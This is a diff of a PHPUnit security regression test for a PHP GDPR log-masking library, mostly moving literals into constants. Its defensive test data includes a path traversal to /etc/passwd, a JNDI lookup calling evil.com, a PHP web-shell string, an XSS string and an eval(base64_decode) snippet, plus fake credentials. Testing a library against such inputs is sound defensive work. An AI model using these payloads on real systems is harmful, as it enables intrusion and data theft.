@@ -9,6 +9,7 @@ use Throwable;
 use DateTimeImmutable;
 use PHPUnit\Framework\TestCase;
 use Tests\TestHelpers;
+use Tests\TestConstants;
 use PHPUnit\Framework\Attributes\Test;
 use PHPUnit\Framework\Attributes\CoversClass;
 use PHPUnit\Framework\Attributes\DataProvider;
@@ -19,6 +20,7 @@ use Ivuorinen\MonologGdprFilter\MaskConstants;
 use Ivuorinen\MonologGdprFilter\RateLimiter;
 use Ivuorinen\MonologGdprFilter\RateLimitedAuditLogger;
 use Ivuorinen\MonologGdprFilter\FieldMaskConfig;
+use Ivuorinen\MonologGdprFilter\Exceptions\GdprProcessorException;
 use Ivuorinen\MonologGdprFilter\PatternValidator;
 use Ivuorinen\MonologGdprFilter\DataTypeMasker;
 use InvalidArgumentException;
@@ -46,6 +48,10 @@ use RuntimeException;
 class SecurityRegressionTest extends TestCase
 {
     use TestHelpers;
+
+    private const MALICIOUS_PATH_PASSWD = '../../../etc/passwd';
+    private const MALICIOUS_PATH_JNDI = '${jndi:ldap://evil.com/}';
+    private const FAKE_REDIS_CONNECTION = 'redis://fake-test-user:fake-test-pass@example.test:6379';
 
     #[\Override]
     protected function setUp(): void
@@ -158,7 +164,7 @@ class SecurityRegressionTest extends TestCase
             'Database connection failed: host=prod-db.internal.com user=admin password=secret123',
             'File not found: /var/www/secret-app/config/database.php',
             'API key invalid: sk_live_abc123def456ghi789',
-            'Redis connection failed: redis://user:pass@internal-redis:6379',
+            'Redis connection failed: ' . self::FAKE_REDIS_CONNECTION,
             'JWT secret key: super_secret_jwt_key_2024',
         ];
 
@@ -177,12 +183,12 @@ class SecurityRegressionTest extends TestCase
                 dataTypeMasks: [],
                 conditionalRules: [
                     'failing_rule' =>
-                    /**
-                     * @return never
-                     */
-                    function (LogRecord $record) use ($sensitiveMessage): void {
-                        throw new RuntimeException($sensitiveMessage);
-                    }
+                        /**
+                         * @return never
+                         */
+                        function () use ($sensitiveMessage): void {
+                            throw new GdprProcessorException($sensitiveMessage);
+                        }
                 ]
             );
 
@@ -190,7 +196,7 @@ class SecurityRegressionTest extends TestCase
                 datetime: new DateTimeImmutable(),
                 channel: 'test',
                 level: Level::Error,
-                message: 'Test message',
+                message: TestConstants::MESSAGE_DEFAULT,
                 context: []
             );
 
@@ -272,7 +278,7 @@ class SecurityRegressionTest extends TestCase
             datetime: new DateTimeImmutable(),
             channel: 'test',
             level: Level::Info,
-            message: 'Test message',
+            message: TestConstants::MESSAGE_DEFAULT,
             context: $deepNesting
         );
 
@@ -486,8 +492,8 @@ class SecurityRegressionTest extends TestCase
     public function fieldPathInjectionPrevention(): void
     {
         $maliciousFieldPaths = [
-            '../../../etc/passwd' => FieldMaskConfig::remove(),
-            '${jndi:ldap://evil.com/}' => FieldMaskConfig::replace(MaskConstants::MASK_MASKED),
+            self::MALICIOUS_PATH_PASSWD => FieldMaskConfig::remove(),
+            self::MALICIOUS_PATH_JNDI => FieldMaskConfig::replace(MaskConstants::MASK_MASKED),
             '<?php system($_GET["cmd"]); ?>' => FieldMaskConfig::remove(),
             'javascript:alert("xss")' => FieldMaskConfig::replace(MaskConstants::MASK_MASKED),
             'eval(base64_decode("..."))' => FieldMaskConfig::remove(),
@@ -507,10 +513,10 @@ class SecurityRegressionTest extends TestCase
             datetime: new DateTimeImmutable(),
             channel: 'test',
             level: Level::Info,
-            message: 'Test message',
+            message: TestConstants::MESSAGE_DEFAULT,
             context: [
-                '../../../etc/passwd' => 'root:x:0:0:root:/root:/bin/bash',
-                '${jndi:ldap://evil.com/}' => 'malicious_payload',
+                self::MALICIOUS_PATH_PASSWD => 'root:x:0:0:root:/root:/bin/bash',
+                self::MALICIOUS_PATH_JNDI => 'malicious_payload',
             ]
         );
 
@@ -521,14 +527,14 @@ class SecurityRegressionTest extends TestCase
 
         // Test that malicious field paths don't cause code execution
         // Note: Current implementation may not fully process all field path types
-        if (isset($result->context['../../../etc/passwd'])) {
+        if (isset($result->context[self::MALICIOUS_PATH_PASSWD])) {
             // If field is present, it should be processed safely
-            $this->assertIsString($result->context['../../../etc/passwd']);
+            $this->assertIsString($result->context[self::MALICIOUS_PATH_PASSWD]);
         }
 
-        if (isset($result->context['${jndi:ldap://evil.com/}'])) {
+        if (isset($result->context[self::MALICIOUS_PATH_JNDI])) {
             // If field is present and processed, check if it's masked
-            $value = $result->context['${jndi:ldap://evil.com/}'];
+            $value = $result->context[self::MALICIOUS_PATH_JNDI];
             $this->assertTrue(
                 $value === MaskConstants::MASK_MASKED || $value === 'malicious_payload',
                 'Field should be either masked or safely processed'
@@ -549,7 +555,7 @@ class SecurityRegressionTest extends TestCase
             patterns: [],
             fieldPaths: [],
             customCallbacks: [
-                'safe_field' => fn($value): string => 'masked_' . strlen((string)$value),
+                'safe_field' => fn($value): string => 'masked_' . strlen((string) $value),
             ],
             auditLogger: null,
             maxDepth: 100,
@@ -560,7 +566,7 @@ class SecurityRegressionTest extends TestCase
             datetime: new DateTimeImmutable(),
             channel: 'test',
             level: Level::Info,
-            message: 'Test message',
+            message: TestConstants::MESSAGE_DEFAULT,
             context: [
                 'safe_field' => 'sensitive_data',
             ]
@@ -620,7 +626,7 @@ class SecurityRegressionTest extends TestCase
             datetime: new DateTimeImmutable(),
             channel: 'test',
             level: Level::Info,
-            message: 'Test message',
+            message: TestConstants::MESSAGE_DEFAULT,
             context: ['boundary_value' => $boundaryValue]
         );
 
